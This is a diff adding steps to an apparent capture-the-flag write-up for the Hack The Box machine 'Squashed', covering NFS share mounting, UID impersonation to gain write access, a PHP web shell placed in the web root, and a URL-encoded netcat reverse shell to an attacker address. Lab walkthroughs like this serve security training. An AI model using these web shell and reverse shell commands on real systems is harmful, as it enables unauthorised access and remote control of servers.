@@ -68,17 +68,124 @@ Directory Bruteforce (Dirsearch):
 dirsearch -u http://squashed.htb
 ```
 
-* No lucrative findings
+* <mark style="color:yellow;">No lucrative findings</mark>
 
 ### Port 2049 - NFS
 
+List available NFS shares:
 
+```
+showmount -e squashed.htb
+
+/home/ross    *
+/var/www/html *
+```
+
+Mount the home directory:
+
+```
+sudo mount -t nfs squashed.htb:/home/ross /mnt
+```
+
+Enumerate mounted directory:
+
+```
+find /mnt -ls
+```
+
+<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:yellow;">We can see that the contents of this directory are all 1001. This is the default permission set for a newly created user. It is 1001 because we do not have a user on our machine with those permissions. So what happens if we try to access it with a newly created user?</mark>
+
+Create user:
+
+```
+adduser hacker
+```
+
+We can now see **hacker** instead of id 1001 because we have added **hacker** to the machine with the same permissions:
+
+<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Switch user to **hacker**:&#x20;
+
+```
+su hacker -c bash
+```
+
+There is not anything of use in here let's mount the next directory.
+
+We will need to unmount the current directory first:
+
+```
+sudo umount /mnt
+sudo mount -t nfs squashed.htb:/var/www/html /mnt
+```
+
+After viewing the contents, we see a new id of 2017. We can set this with `usermod`:
+
+```
+sudo usermod -u 2017 hacker
+```
+
+Switch user:&#x20;
+
+```
+su hacker -c bash
+```
+
+We can now see that we have access to everything with our new id of 2017:
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+It appears that we are in the <mark style="color:yellow;">web root directory. Can we write to this?</mark>
+
+```
+echo "Hacker-here" > /mnt/hacker.html
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Yes, we can! Time to place a webshell in this directory and gain access to this machine!
 
 ## Exploitation
 
-### Name of the technique
+Since we found out that /var/www/html is writeable through NFS exploitation, we can place a webshell in here and gain access to the webserver!
 
-This is the exploit
+Adding webshell into /var/www/html:
+
+```
+echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > /mnt/backdoor.php
+```
+
+Commands can be executed through the web browser via <mark style="color:yellow;">`?cmd=whoami`</mark>
+
+<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+Let's grab a reverse shell through revshells and gain access to this machine
+
+{% embed url="https://www.revshells.com/" %}
+
+* nc mkfifo
+* Be sure to URL encode it
+
+This is what my URL encoded reverse shell looked like:
+
+```
+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.10%201337%20%3E%2Ftmp%2Ff
+```
+
+Fix your shell:
+
+```
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
+
+{% embed url="https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal" %}
+
+If you are using a Terminal emulator such as Terminator, I found it easier to use the default terminal program for reverse shells.
+
+<mark style="color:yellow;">The user.txt flag can be found in alex's home directory!</mark>
 
 ## Privilege Escalation
 
